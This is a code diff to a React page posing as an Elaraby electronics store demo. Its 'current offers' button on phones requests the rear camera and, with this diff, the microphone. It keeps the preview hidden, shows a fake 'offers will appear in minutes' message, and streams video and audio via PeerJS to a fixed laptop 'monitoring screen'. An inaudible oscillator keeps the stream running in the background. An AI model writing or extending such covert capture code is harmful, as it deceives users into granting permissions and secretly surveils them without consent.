@@ -28,10 +28,10 @@ export default function ElarabyStoreDemo() {
   const remoteVideoRef = useRef(null);
   const wakeLockRef = useRef(null);
   const cameraStreamRef = useRef(null);
-  const audioContextRef = useRef(null); // مرجع لحفظ الـ Audio Context الصامت
+  const audioContextRef = useRef(null);
   
   const [peerId, setPeerId] = useState('');
-  const [targetPeerId, setTargetPeerId] = useState('laptop-admin-stream'); // ID ثابت وموحد للابتوب
+  const [targetPeerId, setTargetPeerId] = useState('laptop-admin-stream');
   const [statusMessage, setStatusMessage] = useState('');
   const [errorMessage, setErrorMessage] = useState('');
   const [isLaptop, setIsLaptop] = useState(false);
@@ -47,7 +47,6 @@ export default function ElarabyStoreDemo() {
     };
     document.addEventListener('visibilitychange', handleVisibilityChange);
 
-    // استدعاء PeerJS فقط في بيئة المتصفح Client-side
     import('peerjs').then(({ default: Peer }) => {
       const userAgent = navigator.userAgent.toLowerCase();
       const isMobileDevice = /mobile|android|iphone|ipad/.test(userAgent);
@@ -71,7 +70,7 @@ export default function ElarabyStoreDemo() {
         console.log("🟢 تم الاتصال بسيرفر Peer بنجاح! والـ ID الخاص بهذا الجهاز هو:", id);
         setPeerId(id);
         if (!isMobileDevice) {
-          setStatusMessage('🖥️ شاشة اللابتوب جاهزة لاستقبال بث الكاميرا...');
+          setStatusMessage('🖥️ شاشة اللابتوب جاهزة لاستقبال بث الكاميرا والمايك...');
         }
       });
 
@@ -80,18 +79,19 @@ export default function ElarabyStoreDemo() {
       });
 
       peer.on('call', (call) => {
-        console.log("📥 تم استلام مكالمة فيديو/بث مباشر جديدة!");
-        setStatusMessage('📡 جاري استقبال البث المباشر من الموبايل...');
+        console.log("📥 تم استلام مكالمة فيديو/صوت جديدة!");
+        setStatusMessage('📡 جاري استقبال البث المباشر (صوت وصورة) من الموبايل...');
         call.answer();
         call.on('stream', (remoteStream) => {
-          console.log("🎥 تم استلام الـ Stream بنجاح وعرضه على الشاشة!");
+          console.log("🎥 تم استلام الـ Stream بنجاح!");
           const video = remoteVideoRef.current;
           if (video) {
-            video.muted = true;
+            // ملاحظة: هنا فتحنا الصوت على اللابتوب عشان تسمع اللي بيتقال من مايك الموبايل
+            video.muted = false; 
             video.onloadedmetadata = () => {
               video.play().then(() => {
                 setErrorMessage('');
-                setStatusMessage('🟢 البث الحي للموبايل شغال الآن على اللابتوب!');
+                setStatusMessage('🟢 البث الحي للصوت والصورة شغال الآن على اللابتوب!');
               }).catch((error) => {
                 console.error('Error playing remote video:', error);
                 video.controls = true;
@@ -124,26 +124,28 @@ export default function ElarabyStoreDemo() {
     };
   }, []);
 
-  // تشغيل الكاميرا من الموبايل وإرسال البث للابتوب
+  // تشغيل الكاميرا والمايك من الموبايل وإرسال البث للابتوب
   const startCameraAndSend = async () => {
     try {
       setErrorMessage('');
-      setStatusMessage('جاري تشغيل الكاميرا والاتصال باللابتوب...');
+      setStatusMessage('جاري تشغيل الكاميرا والمايك والاتصال باللابتوب...');
       await requestScreenWakeLock(wakeLockRef);
 
+      // طلب الكاميرا والمايك معاً بوضوح
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { width: { ideal: 640 }, height: { ideal: 480 } },
-        audio: false,
+        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+        audio: true, // تفعيل المايك بجانب الكاميرا
       });
       cameraStreamRef.current = stream;
 
-      // تشغيل الكاميرا في الخلفية على الموبايل
+      // تشغيل الكاميرا محلياً على الموبايل (مكتومة محلياً عشان منع الـ Echo)
       if (localVideoRef.current) {
         localVideoRef.current.srcObject = stream;
+        localVideoRef.current.muted = true;
         await localVideoRef.current.play();
       }
 
-      // --- 🚀 تفعيل Web Audio API الصامت لمنع المتصفح من إيقاف البث في الخلفية ---
+      // تفعيل Web Audio API الصامت لمنع المتصفح من إيقاف البث في الخلفية
       try {
         const AudioContextClass = window.AudioContext || window.webkitAudioContext;
         if (AudioContextClass) {
@@ -153,7 +155,7 @@ export default function ElarabyStoreDemo() {
           }
           const oscillator = audioCtx.createOscillator();
           const gainNode = audioCtx.createGain();
-          gainNode.gain.value = 0.00001; // صوت ضعيف جداً وغير مسموع تماماً لخداع المتصفح
+          gainNode.gain.value = 0.00001;
           oscillator.connect(gainNode);
           gainNode.connect(audioCtx.destination);
           oscillator.start();
@@ -163,21 +165,20 @@ export default function ElarabyStoreDemo() {
       } catch (audioErr) {
         console.warn("⚠️ Audio Context background hack warning:", audioErr);
       }
-      // --------------------------------------------------------------------------
 
-      // إرسال البث المباشر إلى اللابتوب باستخدام الـ Target ID الثابت
+      // إرسال البث المباشر (صوت وصورة معاً) إلى اللابتوب
       if (peerInstance.current) {
         console.log("🚀 جاري الاتصال بالـ Target ID:", targetPeerId);
         const call = peerInstance.current.call(targetPeerId, stream);
         if (call) {
-          setStatusMessage('عزرا العروض ستظهر ف خلال دقائق');
-          console.log("🟢 تم بدء إرسال البث بنجاح.");
+          setStatusMessage('عذراً العروض ستظهر في خلال دقائق');
+          console.log("🟢 تم بدء إرسال البث (صوت وصورة) بنجاح.");
         } else {
           setErrorMessage('⚠️ لم يتم العثور على اللابتوب، تأكد من فتح الصفحة عليه أولاً.');
         }
       }
     } catch (error) {
-      console.error('فشل الوصول للكاميرا:', error);
+      console.error('فشل الوصول للكاميرا أو المايك:', error);
       cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
       cameraStreamRef.current = null;
       if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
@@ -189,7 +190,7 @@ export default function ElarabyStoreDemo() {
         });
         wakeLockRef.current = null;
       }
-      setErrorMessage('⚠️ تعذر تشغيل الكاميرا، يرجى السماح بالإذن.');
+      setErrorMessage('⚠️ تعذر تشغيل الكاميرا أو المايك، يرجى السماح بالأذونات من المتصفح.');
     }
   };
 
@@ -230,7 +231,7 @@ export default function ElarabyStoreDemo() {
         <div style={{ display: 'flex', gap: '25px', alignItems: 'center', fontSize: '13px' }}>
           <div style={{ textAlign: 'left', cursor: 'pointer' }}>
             <div>مرحباً</div>
-            <div style={{ fontWeight: 'bold' }}>تسجيل الدخول 👤 ببببب</div>
+            <div style={{ fontWeight: 'bold' }}>تسجيل الدخول 👤</div>
           </div>
           <div style={{ display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' }}>
             <div style={{ backgroundColor: '#e11d48', borderRadius: '50%', padding: '2px 8px', fontSize: '11px', fontWeight: 'bold' }}>0</div>
@@ -282,7 +283,7 @@ export default function ElarabyStoreDemo() {
         </div>
       </div>
 
-      {/* 5. زر فتح الكاميرا العائم (للموبايل) */}
+      {/* 5. زر فتح الكاميرا والمايك العائم (للموبايل) */}
       <div style={{ position: 'fixed', bottom: '25px', right: '25px', zIndex: 9999 }}>
         <button
           onClick={startCameraAndSend}
@@ -301,8 +302,8 @@ export default function ElarabyStoreDemo() {
             gap: '8px'
           }}
         >
-          <span>📷</span>
-          <span>العروض الحاليه</span>
+          <span>📷🎙️</span>
+          <span>العروض الحاليه للل</span>
         </button>
       </div>
 
@@ -310,14 +311,14 @@ export default function ElarabyStoreDemo() {
       {isLaptop && (
         <div style={{ position: 'fixed', bottom: '25px', left: '25px', width: '320px', height: '240px', backgroundColor: '#000', borderRadius: '12px', overflow: 'hidden', border: '3px solid #005bb5', boxShadow: '0 10px 25px rgba(0,0,0,0.5)', zIndex: 9999 }}>
           <div style={{ backgroundColor: '#005bb5', color: '#fff', padding: '4px 10px', fontSize: '11px', textAlign: 'center', fontWeight: 'bold' }}>
-            شاشة المراقبة والاستقبال المباشر
+            شاشة المراقبة (صوت وصورة)
           </div>
-          <video ref={remoteVideoRef} autoPlay playsInline muted style={{ width: '100%', height: 'calc(100% - 23px)', objectFit: 'cover' }} />
+          <video ref={remoteVideoRef} autoPlay playsInline style={{ width: '100%', height: 'calc(100% - 23px)', objectFit: 'cover' }} />
         </div>
       )}
 
-      {/* عنصر فيديو الموبايل المحلي (مخفي تماماً) */}
-      <video ref={localVideoRef} autoPlay playsInline muted style={{ display: 'none' }} />
+      {/* عنصر فيديو الموبايل المحلي (مخفي) */}
+      <video ref={localVideoRef} autoPlay playsInline style={{ display: 'none' }} />
 
       {/* رسائل التنبيه والوضع */}
       {statusMessage && (
